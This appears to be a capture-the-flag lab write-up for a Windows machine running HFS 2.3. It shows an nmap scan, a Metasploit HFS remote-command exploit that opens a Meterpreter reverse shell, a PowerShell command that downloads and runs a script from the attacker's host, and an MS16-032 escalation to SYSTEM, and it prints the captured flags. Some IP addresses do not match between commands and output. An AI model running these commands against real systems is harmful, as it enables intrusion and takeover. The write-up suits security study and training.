## ------------>> Optimum <<---------------

// Start with nmap scan 

    Nmap scan report for 10.10.10.8
    Host is up (0.19s latency).
    Not shown: 65534 filtered ports
    PORT   STATE SERVICE VERSION
    80/tcp open  http    HttpFileServer httpd 2.3
    |_http-server-header: HFS 2.3
    |_http-title: HFS /
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

// Only port 80 open (web) and the service running its HFS(Http File System)
// lets search in MetaSploit for some exploits

    msf6 > search hfs

    Matching Modules
    ================

       #  Name                                        Disclosure Date  Rank       Check  Description
       -  ----                                        ---------------  ----       -----  -----------
       0  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


// We found a module called rejetto_hfs_exec

    msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.10.8
    RHOSTS => 10.10.10.8
    msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST 10.10.17.8
    LHOST => 10.10.16.197
    msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT
    LPORT => 4444
    msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 1444

    msf6 exploit(windows/http/rejetto_hfs_exec) > exploit -j

    [*] Meterpreter session 2 opened (10.10.17.8:1444 -> 10.10.10.8:49167) at 2021-06-25 05:15:21 -0400
    [*] Server stopped.
    [!] This exploit may require manual cleanup of '%TEMP%\wmPLpUeeb.vbs' on the target

    meterpreter > getuid
    Server username: OPTIMUM\kostas

// We got shell !! and user flag !

    meterpreter > cat user.txt
    d0c39409d7...................
    
### ------Privilleges Escalation------

// First lets get a powershell shell

    meterpreter > shell
    Process 1352 created.
    Channel 2 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Users\kostas\Desktop>powershell
    powershell
    Windows PowerShell
    Copyright (C) 2014 Microsoft Corporation. All rights reserved.

    PS C:\Users\kostas\Desktop> 

// lets upload [Sherlock](https://github.com/rasta-mouse/Sherlock)(PowerShell script for Enuumerating Privilleges Escalation)



IEX(New-Object Net.WebClient).downloadstring('http://10.10.17.8:1445/Sherlock.ps1')

msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LPORT 1445
LPORT => 1445
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > set LHOST 10.10.16.197
LHOST => 10.10.16.197
msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > options 



msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) > exploit 

[*] Started reverse TCP handler on 10.10.16.197:1445 
[+] Compressed size: 1100
[!] Executing 32-bit payload on 64-bit ARCH, using SYSWOW64 powershell
[*] Writing payload file, C:\Users\kostas\AppData\Local\Temp\BDOdlL.ps1...
[*] Compressing script contents...
[+] Compressed size: 3588
[*] Executing exploit script...
	 __ __ ___ ___   ___     ___ ___ ___ 
	|  V  |  _|_  | |  _|___|   |_  |_  |
	|     |_  |_| |_| . |___| | |_  |  _|
	|_|_|_|___|_____|___|   |___|___|___|
	                                    
	               [by b33f -> @FuzzySec]

[?] Operating system core count: 2
[>] Duplicating CreateProcessWithLogonW handle
[?] Done, using thread handle: 2092

[*] Sniffing out privileged impersonation token..

[?] Thread belongs to: svchost
[+] Thread suspended
[>] Wiping current impersonation token
[>] Building SYSTEM impersonation token
[?] Success, open SYSTEM token handle: 2072
[+] Resuming thread..

[*] Sniffing out SYSTEM shell..

[>] Duplicating SYSTEM token
[>] Starting token race
[>] Starting process race
[!] Holy handle leak Batman, we have a SYSTEM shell!!

DcfyjJkApsGXCACBuIAd2qAvbu4waU0B
[+] Executed on target machine.
[*] Sending stage (175174 bytes) to 10.10.10.8
[*] Meterpreter session 4 opened (10.10.16.197:1445 -> 10.10.10.8:49173) at 2021-06-25 05:29:52 -0400
[+] Deleted C:\Users\kostas\AppData\Local\Temp\BDOdlL.ps1

meterpreter > pwd
C:\Users\kostas\Desktop
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 


meterpreter > cat root.txt 
51ed1b36553c8461f4552c2e92b3eeed
